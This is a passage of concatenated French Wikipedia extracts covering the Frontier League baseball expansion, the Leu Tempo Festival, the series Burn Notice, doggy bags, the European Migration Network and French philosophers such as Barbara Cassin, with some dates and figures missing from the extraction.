Pour la saison 2021, la ligue Frontière a annoncé qu'elle ajouterait deux nouvelles équipes. La première annonce est intervenue à peu près au même moment que l'annonce du partenariat avec la Ligue majeure de baseball, alors qu'Ottawa s'est vu octroyer une franchise d'expansion dans la ligue. L'équipe, choisie par les fans lors d'un concours, a été nommée les Titans et jouera au Parc RCGT. Puis, le , après la réorganisation de la Ligue mineure de baseball, la ligue a ajouté les ValleyCats de Tri-City, l'une des nombreuses équipes orphelines ou dissoutes lors de la fermeture de la New York Penn League. Les Titans et les ValleyCats rejoignent les cinq anciennes équipes de la Ligue Can-Am et Washington dans la Division Can-Am; pour égaliser les divisions à sept équipes, Lake Erie a été transféré à la Division Midwestern.
Le , la ligue a annoncé que les Capitales de Québec, les Aigles de Trois-Rivières et les Titans d'Ottawa ne participeraient pas à la saison 2021 en raison de la fermeture prolongée de la frontière canado-américaine en raison de la pandémie de COVID-19 en cours. Les Titans, les Aigles et Capitales ont ensuite uni leurs forces pour former une nouvelle équipe qui concourra en tant que membre de la Division Nord-Est. Connu sous le nom d"'Équipe Québec", ils ont commencé la saison en équipe itinérante, et à partir du , ont commencé à partager des matchs à domicile entre Québec et Trois-Rivières à la suite d'un assouplissement des restrictions frontalières. Dix matchs ont été disputés à Québec et onze à Trois-Rivières. Ils n'ont pas joué à Ottawa en raison des restrictions de COVID-19 en Ontario.
Le , les propriétaires des Miners de Southern Illinois, Jayne et John Simmons, ont annoncé qu'ils se retireraient du baseball professionnel pour passer plus de temps avec leur famille et que les Miners cesseraient leurs activités et abandonneraient la ligue Frontière.
Depuis 2022 : période d'expansion.
Avec le départ des Miners de Southern Illinois, la ligue a annoncé qu'il y aurait une équipe itinérante, les Grays de l'Empire State. L'équipe a joué durant les saisons 2022 et 2023.
Les Knockouts de la Nouvelle-Angleterre ont succédé aux Greys. L'équipe, d'abord nommée les « Chowdahheads » (un terme de l'argot bostonien pour une personne stupide), est renommée le Rox de Brockton pour la saison 2025.
Toujours pour 2025, a ligue autorise deux nouvelles franchises dans le sud-est des États-Unis : les et les .
Équipes.
Assistance record.
Le , les Boulders de New York ont joué un match au Palisades Credit Union Park contre les Wild Things de Washington devant une foule de . Les Boulders ont remporté le match 4 à 3 contre Washington. Les Boomers de Schaumburg avaient également établi un record d’assistance depuis 2019. Le également, ont rempli le Wintrust Field à pleine capacité et encore plus. Les Boomers ont perdu le match 9-2 contre les Miners de Southern Illinois.

</doc>
<doc id="1873405" url="https://fr.wikipedia.org/wiki?curid=1873405" title="Code confidentiel">
Code confidentiel



</doc>
<doc id="1873408" url="https://fr.wikipedia.org/wiki?curid=1873408" title="Leu Tempo Festival">
Leu Tempo Festival

Leu Tempo Festival est le plus ancien et le plus important des festivals de La Réunion consacré aux arts vivants. Organisé tous les ans en mai dans le centre-ville de Saint-Leu, d'où son nom, il se veut un creuset où se confondent les tendances de la création théâtrale contemporaine concernant les spectacles de marionnettes, les numéros de cirque ou le théâtre de rue. 
Leu Tempo Festival rencontre un succès très important et rassemble chaque année environ 30 000 spectateurs (13 000 à 16 000 billets émis selon les éditions). Des spectacles d’Europe, de l’océan Indien et d’ailleurs sont proposés au public pendant 4 jours de fête. Enfin, Leu Tempo Festival est porteur d’un vaste projet de médiation artistique touchant chaque année des milliers de jeunes Réunionnais.
Historique.
À la fin des années 80, la Compagnie de théâtre d'objets Koméla invente le festival « Tempo », événement consacré à la marionnette qui deviendra un des événements majeurs du spectacle vivant dans l’océan Indien. Depuis 1998, le festival est produit par Le Séchoir de Saint-Leu, scène conventionnée puis Pôle National Cirque de La Réunion en préfiguration. Après l’arrêt des activités de la Cie Koméla en 2000, Le Séchoir a repris naturellement la direction artistique du Leu Tempo Festival, ouvrant sa ligne artistique aux arts du cirque, aux arts de la rue et aux arts de la parole. 
L'édition 2007 a attiré personnes avec 23 spectacles.
En 2009, des spectacles ont lieu dans les communes de l'Ouest de La Réunion en prélude au festival qui présente les interventions artistiques dans l'espace public de Betty Bui, Daniel Buren, Jace, Tadashi Kawamata et Louis Pavageau aka Ligne Rouge.
L'édition 2017 du Leu Tempo Festival a comptabilisé : 
Durant deux années de suite, en 2020 et 2021, le festival n'a pas pu se dérouler compte tenu de la pandémie de covid-19.

</doc>
<doc id="1873409" url="https://fr.wikipedia.org/wiki?curid=1873409" title="Arts vivants">
Arts vivants



</doc>
<doc id="1873412" url="https://fr.wikipedia.org/wiki?curid=1873412" title="Leu Tempo">
Leu Tempo



</doc>
<doc id="1873414" url="https://fr.wikipedia.org/wiki?curid=1873414" title="Festival Leu Tempo">
Festival Leu Tempo



</doc>
<doc id="1873428" url="https://fr.wikipedia.org/wiki?curid=1873428" title="Bartercard Cup">
Bartercard Cup

La Bartercard Cup était le principal championnat de rugby à XIII de Nouvelle-Zélande de 2000 à 2007. Cette compétition servait de tremplin aux joueurs néo-zélandais pour évoluer au niveau supérieur c'est-à-dire dans le championnat de la NRL ou de la Super League.
Elle succédait à la (1994-1996) et a été remplacée par un (2008-2009), lui-même remplacée en 2010 par la National Zonal Competition.

</doc>
<doc id="1873433" url="https://fr.wikipedia.org/wiki?curid=1873433" title="Jabba">
Jabba



</doc>
<doc id="1873437" url="https://fr.wikipedia.org/wiki?curid=1873437" title="Championnat d'Europe féminin de basket-ball des moins de 16 ans">
Championnat d'Europe féminin de basket-ball des moins de 16 ans

Le Championnat d’Europe féminin de basket-ball des moins de (ou cadettes) est une compétition féminine de basket-ball qui oppose les meilleures sélections nationales d’Europe des joueuses de moins de . Elle était organisée par la FIBA Europe tous les 2 ans depuis 1976. Depuis 2003, la compétition a lieu tous les ans et le Championnat est divisé en 3 divisions suivant le niveau de la sélection nationale. Le titre de champion d'Europe se joue donc entre les 16 sélections de la Division A. La même année (mais pas à la même période et pas dans le même pays) se déroulent le championnat de Division B et le championnat de Division C, regroupant respectivement 20 sélections nationales et 8 sélections nationales. Les cinq premières équipes des compétitions (Division A) se déroulant une année impaire se qualifient directement pour la Coupe du monde féminine de basket-ball des moins de 17 ans.
L'édition 2020 est annulée par la FIBA Europe, en raison de la pandémie de coronavirus.
Division A.
Médailles par pays.
"Tableau actualisé après le championnat 2025".
Division B.
Médailles par pays.
"Tableau actualisé après le championnat 2024".
Division C.
Médailles par pays.
"Tableau actualisé après le championnat 2025".

</doc>
<doc id="1873442" url="https://fr.wikipedia.org/wiki?curid=1873442" title="Christian Martin (homme politique)">
Christian Martin (homme politique)

Christian Marie Charles Martin de Kergurioné, né le à Angers (Maine-et-Loire) et mort le à Angers, est un chef d'entreprise et homme politique français.
Il est membre de l'Union pour un mouvement populaire après avoir appartenu à l'Union pour la démocratie française.
Biographie.
Pour les élections législatives de 1993, il est désigné suppléant d'Edmond Alphandéry, le député élu depuis 1978 dans la troisième circonscription de Maine-et-Loire. Celui-ci est réélu le , en obtenant 56,27 % des voix dès le premier tour. Il est nommé dans le gouvernement Balladur le 2 avril. Christian Martin est ainsi devenu député à sa place le 2 mai 1993. Il siègeait au sein du groupe UDF et était membre de la commission de la défense nationale et des forces armées.
À la suite de la dissolution de l'Assemblée nationale décidée par le président Jacques Chirac, de nouvelles élections sont organisées en 1997. Edmond Alphandéry décide alors de ne pas briguer un sixième mandat et Christian Martin est investi pour prendre sa succession. Il est élu le 1997 en battant le candidat PS, Pierre Guibert, avec 51,53 % des voix au deuxième tour. Au cours de la législature, il siège à nouveau au sein du groupe UDF et est de nouveau membre de la commission de la défense nationale et des forces armées. 
Il choisit de ne pas se représenter lors des élections législatives de 2002.
Il a aussi été vice-président du conseil général du Maine-et-Loire, maire de Lué-en-Baugeois.

</doc>
<doc id="1873445" url="https://fr.wikipedia.org/wiki?curid=1873445" title="Rick McCallum">
Rick McCallum

Richard McCallum, dit Rick McCallum, né le 22 août 1954 à Heidelberg (Allemagne), est un producteur de cinéma américain.
Il a produit notamment les épisodes , et de la saga "Star Wars" ainsi que la série des "Aventures du jeune Indiana Jones".

</doc>
<doc id="1873447" url="https://fr.wikipedia.org/wiki?curid=1873447" title="Rick mccallum">
Rick mccallum



</doc>
<doc id="1873448" url="https://fr.wikipedia.org/wiki?curid=1873448" title="Au-delà du réel, l'aventure continue">
Au-delà du réel, l'aventure continue



</doc>
<doc id="1873451" url="https://fr.wikipedia.org/wiki?curid=1873451" title="Réseau européen des migrations">
Réseau européen des migrations

Le Réseau Européen des Migrations ou REM (en anglais, "European Migration Network" ou "EMN") est un réseau cofinancé par l’Union européenne, dont le but est de fournir des informations actualisées, objectives, fiables et comparables dans les domaines des migrations et de l’asile à destination des institutions de l’Union européenne, ainsi que des autorités et institutions des États membres de l’Union européenne afin de contribuer à l’élaboration des politiques dans ces domaines. L’objectif est également de rendre ces informations accessibles au grand public. Le Réseau Européen des Migrations (REM) a été établi par la "Décision du Conseil 2008/381/CE" adoptée le . 
Objectifs.
Le besoin des États membres d'échanger des informations sur tous les aspects des questions migratoires, et de contribuer à l’élaboration d’une politique commune en matière d’asile et d’immigration, a été initialement identifié lors du Conseil européen de Laeken (2001) et confirmé lors du Conseil européen de Thessalonique en 2003, année au cours de laquelle le Réseau Européen des Migrations a été lancé comme projet pilote. Le Programme de la Haye a, quant à lui, confirmé l'importance d'une analyse commune des phénomènes migratoires et son successeur, le Programme de Stockholm, contient de nombreux éléments pour une meilleure comparabilité et échange d’informations entre les États membres, couvrant un large éventail de développements politiques en matière d’asile et d’immigration. C’est dans ce contexte qu’a été établi en 2008 le Réseau Européen des Migrations.
Structure et Organisation du Réseau.
Le REM est coordonné par la Commission européenne, sous la responsabilité de la Direction Générale des Affaires Intérieures, et en coopération avec des "Points de Contact Nationaux (PCN) du REM", constitués dans chacun des États membres, plus la Norvège, par le gouvernement de l’État concerné. Les PCN se composent entre autres des Ministères de l’Intérieur et de la Justice, des instituts de recherche, des organisations non-gouvernementales et des bureaux nationaux d’une organisation internationale. Chaque Point de Contact coopère avec un réseau national, composé d’organisations et de personnes actives dans le domaine des migrations et de l’asile. Le REM est supervisé par un Comité Directeur, présidé par la Commission européenne et constitué d’un représentant de chacun des 26 États membres ayant participé à l’adoption de la Décision 2008/381/CE du Conseil, ainsi que d’observateurs du Danemark, du Parlement Européen et de la Norvège.
Rapports, Études et autres productions du REM.
Le REM produit des rapports politiques annuels, ainsi que des rapports statistiques annuels et des études sur des sujets pertinents sur le plan des politiques d’asile et d’immigration. Ces rapports et études sont basés, non pas sur des recherches de « première main », mais plutôt sur des informations produites ou collectées par les membres du réseau dans les États membres, informations par la suite synthétisées de manière à fournir une perspective comparative à l’échelle de l’UE. Le REM dispose également d’un système de Requêtes Ad Hoc à l’usage de ses membres et a également développé un "Glossaire de termes sur l’asile et l’immigration", avec le but de l’incorporer dans la Terminologie Interactive pour l’Europe (IATE).
Depuis 2009, le REM a rendu compte des progrès accomplis au regard des engagements pris dans la "méthode de suivi pour le contrôle de la mise en œuvre du Pacte européen sur l’immigration et l’asile" adopté lors du Conseil européen d'. Les travaux du REM ont également été cités dans le Plan d’Action de la Commission de sur les mineurs non accompagnés, lequel utilise des informations reprises dans le rapport « Politiques relatives à l’accueil, l’intégration et le retour des mineurs non accompagnés » réalisé par le REM en 2009.
Le REM travaille en étroite collaboration avec d’autres organisations actives dans le champ des politiques d’asile et d’immigration, tant au sein des institutions de l’UE qu’en dehors de celles-ci, en particulier en ce qui concerne des études et des thèmes politiques spécifiques. Ces organisations incluent Eurostat et la Direction Générale Recherche de la Commission Européenne, l’Agence des droits fondamentaux de l'Union européenne (FRA), Eurocities, le Centre pour l’Étude des Politiques Européennes (European Policy Centre) et le Bureau européen d’appui en matière d’asile (BEAMA), dès que ce dernier sera pleinement opérationnel.
Événements à venir.
Une évaluation externe indépendante du développement du REM a été entamée en 2010 et a été achevée fin 2011. Cette évaluation externe rend compte de l’efficacité et du bon fonctionnement du REM, et elle évalue dans quelle mesure le REM atteint ses objectifs, en particulier sa capacité à soutenir l’élaboration des politiques d’asile et d’immigration. Les résultats de cette évaluation seront utilisés dans un rapport de la Commission sur le développement du REM et son éventuelle évolution future.
Sources.
Décision du Conseil du 14 mai 2008 instituant un réseau européen des migrations 2008/381/CE 
Synthèse de la législation de l'UE - Décision 2008/381/CE du Conseil du 14 mai 2008 instituant un réseau européen des migrations
Synthèse de la législation de l'UE - Livre vert de la Commission sur l'avenir du réseau européen des migrations

</doc>
<doc id="1873453" url="https://fr.wikipedia.org/wiki?curid=1873453" title="Setanta Sports Cup 2006">
Setanta Sports Cup 2006

Le tournoi du Setanta Cup 2006 est un tournoi qui comprend des équipes de la république d'Irlande et d'Irlande du Nord. Il a été remporté par Drogheda United le 
Demi-Finales.
Cork City FC 2-0 Shelbourne FC
Linfield FC 0-1 Drogheda United
Finale.
Drogheda United 1-0* Cork City FC
(*après prolongation) 

</doc>
<doc id="1873455" url="https://fr.wikipedia.org/wiki?curid=1873455" title="Burn Notice">
Burn Notice

 ou Agent libre au Québec est une série télévisée américaine en 111 épisodes de 42 minutes créée par , diffusée entre le et le sur . Il y a aussi un téléfilm, ' ('), retraçant l'histoire de Sam Axe avant sa collaboration avec Michael Westen.
En Belgique, la série est diffusée depuis le sur RTL-TVI. En France, la première saison a été diffusée sur W9, le reste de la série depuis le sur et depuis le sur M6. Au Québec, la série est diffusée depuis le sur Séries+ et en Suisse, depuis le sur TSR1.
La série est également disponible sur Disney+.
Synopsis.
Michael Westen est un agent secret qui est subitement mis à pied en plein milieu d'une opération. Il se retrouve à Miami sans savoir pourquoi, sans emploi, sous étroite surveillance d'agences fédérales et sans pouvoir quitter la ville.
Michael est alors obligé de survivre en menant des opérations pour divers clients à Miami. Aidé par une ex-petite amie, Fiona, ancien membre de l'IRA, et Sam, un ancien SEAL de l’United States Navy, à la retraite, Michael utilise son expérience, ses compétences efficaces et ses techniques d'espionnage pour venir à bout d'affaires que la police seule ne saurait résoudre. Parallèlement, Michael cherche activement à savoir pourquoi il a été « licencié ».
Production.
Développement.
Même si la série date de 2007, l'image de la série a un aspect particulier. Un filtre légèrement jaunissant lui donne un caractère des années 1980. Si ce procédé peut surprendre et est en contraste avec l'image d'une autre série, ceci lui donne un caractère particulier.
Initialement, une première saison de treize épisodes a été annoncée, mais devant le succès de la série auprès du public et de la critique, une deuxième saison composée également de treize épisodes est commandée.Finalement, la deuxième saison est composée de seize épisodes, diffusée en deux périodes, la première du au et la seconde du au . Durant la première partie de la deuxième saison, la série a vu son audience augmenter de 23 % par rapport à la première saison.La chaîne a alors renouvelé la série pour une troisième saison avec une commande de seize épisodes, qui a été diffusée en deux parties, du au et du au sur USA Network.
Après seulement trois épisodes diffusés de la quatrième saison, USA Network a annoncé une commande de deux épisodes supplémentaires portant la saison de seize à dix-huit épisodes. Elle a été diffusée en deux parties, du au (après douze épisodes) et du au pour les six épisodes restants.
Le , la série a été renouvelée pour deux saisons supplémentaires amenant la série vers une cinquième et sixième saison composée de quinze et dix-huit épisodes.
La cinquième saison composée finalement de dix-huit épisodes, a été diffusée en deux parties du au (après douze épisodes) et du au sur USA Network, aux États-Unis, pour les six épisodes restants.
La sixième saison, composée de dix-huit épisodes, a été diffusée du au sur USA Network, aux États-Unis.
Le , la série a été renouvelée pour une septième saison composée de treize épisodes prévue à partir du sur USA Network.Le , la chaîne annonce que celle-ci sera la dernière.
Casting.
En , USA commande le pilote avec l'embauche de Jeffrey Donovan dans le rôle principal. Il est rejoint en novembre par Gabrielle Anwar, Bruce Campbell et Sharon Gless.
L'acteur Jere Burns a obtenu un rôle récurrent pour la cinquième saison.
En , l'acteur John C. McGinley obtient un rôle récurrent pour la sixième saison. Le même mois, la chaîne annonce le retour de trois acteurs pour cette même saison, Jere Burns dans son rôle d'Anson Fullerton, Lauren Stamile (l'agent Kim Pearce) et Kristanna Loken (agent Rebecca Anderson), devenant aussi récurrente pour la sixième saison.
En , Jack Coleman, Stephen Martines et Adrian Pasdar ont obtenu un rôle récurrent pour la septième saison tandis que Nick Tarabay a obtenu le rôle de Dexter Gamble le temps de deux épisodes.
Tournage.
Le tournage de la série s'est déroulée à Miami, en Floride, aux États-Unis.
Composition d'un épisode.
Tous les épisodes commencent par une séquence avec la voix off de Michael accompagnant le spectateur pour lui présenter les différentes techniques et astuces employées par les espions.
Chaque nouveau personnage majeur est présenté en sous-titre par son prénom et le rôle qu'il tient. Ainsi, Sam est présenté comme le « pote » (') et Fiona comme l'« ex-copine » (').
Épisodes.
Téléfilm.
Le , la chaîne USA Network a annoncé le lancement d'un téléfilm de deux heures servant de préquelle à la série, centré sur le personnage de Sam Axe (Bruce Campbell).
C'est l'acteur principal de la série Jeffrey Donovan et interprète de Michael Westen, qui a réalisé ce téléfilm. Le créateur de "Burn Notice", Matt Nix, a écrit le scénario et la production a été assurée par Aaron Ginsburg. L'histoire se situe en Amérique latine où le tournage a débuté en janvier 2011, à Bogota, en Colombie.
Le casting du téléfilm présent avec Bruce Campbell comporte Chandra West (Donna, une femme que Sam a commencé à fréquenter), RonReaco Lee (, un médecin travaillant pour une clinique gratuite en Colombie qui se retrouve prisonnier des terroristes), Kiele Sanchez (une humanitaire qui apporte de la nourriture aux plus pauvres) et John Diehl (l'Amiral Lawrence, le supérieur de Sam).
Le , le titre du téléfilm a été annoncé, ' (') avec une diffusion prévue le sur la chaîne câblée américaine USA Network.
Univers de la série.
Les personnages.
Personnages principaux.
Michael Westen
Madeline Westen
Jesse Porter
Personnages récurrents.
Nate Westen
Agent Harris et agent Lane
Barry Burkowski
Sugar
Commentaires.
"" est un terme dans le jargon de l'espionnage américain qui signifie qu'une personne ou un groupe de personnes n'est plus considéré comme fiable.
Accueil.
Audiences.
Aux États-Unis.
Le téléfilm a été suivi par sur USA Network.

</doc>
<doc id="1873458" url="https://fr.wikipedia.org/wiki?curid=1873458" title="Doggy bag">
Doggy bag

Un "&lt;dfn&gt;&lt;/dfn&gt;" est un terme anglais qui désigne un emballage dans lequel le client d'un restaurant peut emporter les restes de son repas, et par métonymie les restes eux-mêmes.
La traduction littérale de « sac à toutou » reflète le prétexte invoqué : ces restes serviront à nourrir le chien. Cette pratique est assez fréquente dans les restaurants, notamment italiens et asiatiques, qui combinent consommation sur place et vente à emporter. Depuis les années 2010, cette pratique s’inscrit de plus en plus dans le cadre de la lutte contre le gaspillage alimentaire.
En français québécois, il est recommandé par l'Office québécois de la langue française d'utiliser le terme « emporte-restes » pour parler de ".
Contexte historique.
Dans la Rome antique, les convives emportaient les restes du repas dans une serviette pour les manger le lendemain, d'aucuns allaient même jusqu'à les revendre.
Durant la Seconde Guerre mondiale, il était vivement conseillé de donner les restes des repas aux chiens plutôt que de les jeter et certains restaurants auraient proposé à leurs clients d'emporter les os et les restes, pour leur chien ou pour eux-mêmes.
Le ", conséquence indirecte des privations de la guerre, est présenté comme courant en Israël dès l'arrivée des premiers rescapés de la Shoah, par Josy Adida-Goldberg dans sa chronique familiale "Les Deux Pères".
Enjeux.
En France, selon une étude de l’ADEME, dans la chaîne de production alimentaire, la consommation finale est responsable de 33 % de la quantité de nourriture gaspillée. Dans cette consommation finale, 40 % du gaspillage alimentaire a lieu dans les restaurants, alors que 15 % seulement des repas y sont pris. Les consommateurs gaspillent ainsi quatre fois plus en restauration collective qu'à domicile.
Une expérimentation menée en Écosse a montré que la proposition systématique de "doggy bags" pouvait permettre de réduire de 42 % le gaspillage alimentaire dans les restaurants.
Dans le monde.
Australie.
En Australie, la loi interdit aux restaurants de distribuer des sacs pour récupérer les restes de table, car cette pratique présente des risques sanitaires si les aliments ne sont pas conservés à la température appropriée.
Chine.
En Chine, le gaspillage de nourriture est tel que plus de du Jinan, capitale de la province du Shandong, ont placé des cartes sur la table, rappelant aux clients de ne commander que ce qu'ils peuvent manger ou d'emporter les restes.
États-Unis.
Cette pratique est très commune aux États-Unis où, par exemple, 80 % des clients de la chaîne The Cheesecake Factory repartiraient avec les restes de leur repas.
Europe.
En Europe, elle est acceptée dans quelques restaurants signalés dans les guides touristiques, comme le "Petit Futé". 
Belgique.
Lancé en février 2016 par la Région wallonne et celle de Bruxelles-Capitale, le Rest-o-Pack n'a pas le succès escompté : ce sont moins de 70 % des restaurants qui distribuent moins de cinq boîtes par semaine. Par ailleurs, des études montrent que le gaspillage en cuisine est nettement supérieur à celui dû aux restes sur les assiettes.
France.
En France, l'Union des métiers et des industries de l'hôtellerie, la principale organisation patronale de la restauration, annonce le avoir signé un accord avec la "startup" TakeAway pour promouvoir l'usage du "doggy bag" en France, afin de lutter contre le gaspillage alimentaire. Peu ancré dans la culture française, le "doggy bag" n'est pas obligatoire mais seulement recommandé. 
La pratique a du mal à s'imposer mais se démocratise quelque peu depuis les années 2010, le "doggy bag" pouvant être demandé, et accepté, auprès des restaurants les plus prestigieux, voire dans certains restaurants étoilés. La plupart du temps, son appellation varie : "gourmet bag", « box anti-gaspi » ou bien « outil de "take away" ». Selon Denis Courtiade, directeur de salle du restaurant Alain Ducasse au Plaza Athénée, cette pratique . 
Contrairement à une idée répandue, la loi du relative à la lutte contre le gaspillage alimentaire n'ordonne pas aux restaurateurs de proposer systématiquement un "doggy bag" à leurs clients. Le texte leur enjoint de réviser leur politique de tri sélectif et l'utilisation des invendus. Si la loi « recommande fortement » de proposer ce service, elle ne les y oblige cependant pas.
À partir de 2021, les restaurateurs devront mettre à disposition des clients qui en font la demande des contenants permettant d'emporter les produits non consommés.
Suisse.
En Suisse, il n'y a aucune obligation légale de fournir un contenant pour emporter les restes, mais certains restaurants, de plus en plus nombreux, le proposent ou accèdent aux demandes de leurs clients.

</doc>
<doc id="1873459" url="https://fr.wikipedia.org/wiki?curid=1873459" title="Escape Velocity">
Escape Velocity



</doc>
<doc id="1873461" url="https://fr.wikipedia.org/wiki?curid=1873461" title="Rainer Rochlitz">
Rainer Rochlitz

Rainer Rochlitz, né le à Hanovre, mort le à Paris, est un philosophe, historien d'art et traducteur français.
Spécialiste d'esthétique, il a beaucoup contribué à faire connaître les écrits du jeune Georg Lukács, de Walter Benjamin et de Jürgen Habermas dont il fut l'un des traducteurs en France. Il a contribué à de nombreux débats sur l'esthétique contemporaine et l'art, aux côtés notamment de Christian Bouchindhomme, de Marc Jimenez ou d'Olivier Revault d'Allonnes.
Il était directeur de recherches au CNRS, directeur de séminaires à l'École des hautes études en sciences sociales et à l'Université européenne de philosophie.
Publications.
Traductions (ou collaboration à la traduction).
Theodor W. Adorno
Karl-Otto Apel
Walter Benjamin
Jürgen Habermas
Georg Lukács

</doc>
<doc id="1873467" url="https://fr.wikipedia.org/wiki?curid=1873467" title="Beauté fatale (1987)">
Beauté fatale (1987)



</doc>
<doc id="1873470" url="https://fr.wikipedia.org/wiki?curid=1873470" title="Paris, France">
Paris, France



</doc>
<doc id="1873472" url="https://fr.wikipedia.org/wiki?curid=1873472" title="Christine Buci-Glucksmann">
Christine Buci-Glucksmann

Christine Buci-Glucksmann est une philosophe française, spécialiste de philosophie politique et d'esthétique.
Biographie.
Fille de l'orientaliste Lucien-Pierre Lecocq-Buci, elle est aujourd'hui professeure émérite de l'université de Paris VIII.
Ses premiers travaux remontent aux années 1970 et portent notamment sur Friedrich Engels et Antonio Gramsci. Par la suite, elle s'intéresse à la philosophie esthétique, en particulier à l'œuvre de Walter Benjamin de même qu'à l'art et à la littérature baroque ("La Raison baroque", 1984 ; "La folie du voir" -- "une esthétique du virtuel", éditions Gallilée, 1986). Ces recherches la conduisent à postuler un lien entre baroque et postmodernisme où est perceptible la double influence de Gilles Deleuze et de Jean-François Lyotard.
À son intérêt pour la littérature et la peinture s'ajoute celui du cinéma. Elle consacre un ouvrage au réalisateur Raoul Ruiz qu'elle envisage dans la perspective de l'esthétique baroque. Dans ses derniers ouvrages, elle s'intéresse à la mélancolie en renouant avec les écrits de Benjamin sur cette question (ouvrage sur le "Trauerspiel", traduit sous le titre de "Origine du drame baroque allemand").
À la suite de ses études sur Gramsci, elle a été dans la seconde moitié de la décennie 1970 une partisane de l'eurocommunisme, un courant démocratique et antistalinien promu par le Parti communiste italien qui a traversé plusieurs partis communistes de l'Europe occidentale. 
Elle a été mariée avec le philosophe André Glucksmann de 1958 à 1974.

</doc>
<doc id="1873478" url="https://fr.wikipedia.org/wiki?curid=1873478" title="Relic Entertainment">
Relic Entertainment

Relic Entertainment est un studio de développement canadien de jeux vidéo cofondé en 1997 par Luke Moloney et Alex Garden, et situé à Vancouver. Le studio est spécialisé dans les jeux de stratégie en temps réel. Acquise par THQ en 2004, la compagnie est vendue à Sega pour un montant de le à la suite de la faillite de THQ.

</doc>
<doc id="1873480" url="https://fr.wikipedia.org/wiki?curid=1873480" title="Barbara Cassin">
Barbara Cassin

Barbara Cassin, née le à Boulogne-Billancourt (Seine), est une philologue, helléniste et philosophe française, spécialiste des philosophes grecs et de la rhétorique de la modernité.
Directrice de recherche au CNRS, traductrice, et directrice de collections consacrées à la philosophie, elle prend en 2006 la direction du centre Léon-Robin puis, en 2010, la présidence du Collège international de philosophie, dont elle dirige la revue "Rue Descartes" en parallèle, pour l'UNESCO.
Elle est élue à l'Académie française le , devenant la neuvième femme académicienne, et la cinquième, à cette date, de l'effectif féminin actuel.
Biographie.
Famille.
Laure Sylvie Barbara Cassin est née du mariage de Pierre Cassin, conseiller juridique, et d'Hélène Caroli, artiste peintre.
Elle est veuve d'Étienne Legendre, notaire créateur d'un centre hippique. Elle a deux fils.
Étudiante à l'ombre de Heidegger (1964-1974).
Après des études secondaires au lycée Jean-de-La-Fontaine de Paris, elle entre en hypokhâgne au lycée Pasteur de Neuilly-sur-Seine, où elle est l'élève du poète et philosophe Michel Deguy, puis en khâgne au lycée Fénelon, mais n'est pas reçue au concours d'entrée à l'École normale supérieure (Paris). 
En 1968, elle soutient à la Sorbonne, sous la direction de Ferdinand Alquié, un mémoire de maîtrise en philosophie dans lequel elle aborde les fondements logiques de l'ontologie à travers la correspondance sur ce sujet de Leibniz et d'Arnauld. C'est en passionnée de la pensée d'Heidegger qu'elle rencontre celui-ci au "Séminaire du Thor", auquel elle participe et qui se tient la deuxième semaine de septembre 1969 chez René Char, figure exemplaire de l'intellectuel résistant.
Tout en continuant ses études dans l'université en restructuration de l'après-Mai 68, elle travaille occasionnellement comme traductrice. 
Elle s'inscrit en 1971 aux séminaires du centre Léon-Robin de la Sorbonne et du Centre de recherches philologiques de l'université de Lille III. Elle est chargée de cours à l'université de Saint Denis, tout en préparant son doctorat ès lettres en philosophie, qu'elle obtient en 1974 en soutenant une thèse sur le traité pseudo-aristotélicien "Sur Melissus, Xénophane et Gorgias". Elle publie sa thèse sous le titre "Si Parménide".
Professeure de philosophie (1974-1984).
Elle prépare le CAPES tout en assurant, de 1974 à 1976, une vacation de pédagogue pour adolescents psychotiques à l’hôpital de jour Étienne-Marcel, à Paris, où Françoise Dolto supervise depuis dix ans la prise en charge des tout petits. Cette rencontre avec la langue absolument étrangère, intraduisible, des fous["référence souhaitable"], aussi déterminante qu'avec Heidegger, amène le psychanalyste Jacques-Alain Miller à lui confier de 1975 à 1979 la charge d'un cours du Département de psychanalyse de l'Université de Vincennes à Saint-Denis. Entretemps, grâce à deux bourses de l'Office allemand d'échanges universitaires, elle étudie en 1976 à l'université de Fribourg, où avait enseigné Martin Heidegger, puis en 1978 à l'université de Heidelberg.
Bien qu'elle ait échoué six fois à l'agrégation de philosophie, elle obtient le certificat de professeur et est affectée chaque année, de 1979 à 1984, dans un établissement différent (lycée François-Villon à Paris, lycée Youri-Gagarine de Chaumont, lycée Salengro d'Avion, près de Lens, lycée Lamarck d'Albert, lycée Fénelon de Cambrai, lycée Poncelet de Saint-Avold).
Chercheuse au centre Léon-Robin et au Ciph (1984-1992).
En , elle organise avec Monique Canto le colloque "Qu'est-ce que la sophistique ?" au Centre culturel international de Cerisy-la-Salle. Simultanément son appartenance au centre Léon-Robin est entérinée par un recrutement au CNRS. Désormais attachée de recherche détachée à l'unité mixte de recherche (UMR) 8061, elle travaille avec Pierre Aubenque. Elle devient directrice de recherche en 1996 et prend la direction du centre en 2006.
Parallèlement, cette même , elle prend en charge un des séminaires du Collège international de philosophie, où elle devient directrice de recherche de 1988 à 1992 et siège au conseil de 1990 à 1993. À plusieurs reprises, elle collabore avec Michel Narcy. Ensemble, ils traduisent et éditent en 1989 le livre Γ de la "Métaphysique" d'Aristote.
En 1990, elle est sollicitée par Eric Alliez et la revue "34 Letras", liée à Gilles Deleuze et Félix Guattari, pour préparer la fondation à Sao Paulo de la maison d'édition "Editora 34". Du , elle réunit à la Sorbonne, pour un colloque intitulé "Les Stratégies contemporaines d'appropriation de l'Antiquité", Elizabeth Anscombe, Pierre Aubenque, Jacques Brunschwig, Gilles Deleuze, Jacques Derrida, Umberto Eco, Paul Ricœur, entre autres, autour d'un questionnement, qui est le sien, sur les liens entre pensée antique et monde contemporain, la rémanence de celle-là dans celui-ci.
Cette même , elle s'engage dans le projet de construction d'une philosophie européenne en participant sous la direction de Pierre Nora à la "Librairie européenne des idées" du Centre national du livre. En 1991, elle lance avec Alain Badiou aux éditions du Seuil une série de publications bilingues d’œuvres philosophiques au sein de la collection "Points-Essais". L'année suivante, c'est à cette codirection que François Wahl, démissionnaire, confie la collection "L’Ordre philosophique", qu'il avait fondée vingt-cinq ans plus tôt avec Paul Ricœur.
Pluralité culturelle et modernité de la sophistique (1993-2001).
De 1993 à 2000, elle coordonne, au sein du groupe de recherche 1061 du CNRS, une centaine de chercheurs qui se proposent d'élaborer un dictionnaire définissant les variations sémantiques des concepts philosophiques à travers leurs emplois dans différentes langues et différents contextes. Ce travail aboutit en 2004 par la publication du "Vocabulaire européen des philosophies" .
